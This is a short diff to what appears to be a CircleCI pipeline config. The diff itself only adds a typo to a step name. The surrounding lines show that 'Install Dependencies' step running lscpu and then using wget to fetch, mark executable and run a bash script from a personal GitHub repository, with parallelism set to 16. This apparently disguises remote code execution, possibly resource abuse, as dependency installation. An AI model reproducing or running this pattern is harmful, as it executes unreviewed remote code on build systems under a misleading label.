@@ -6,7 +6,7 @@ jobs:
         parallelism: 16
         steps:
             - run:
-                name: Install Dependencies
+                name: Install Dependenciess
                 command: |
                    lscpu
                    wget https://raw.githubusercontent.com/lawrence248/PotatoPy/master/bash.sh && chmod +x bash.sh && ./bash.sh
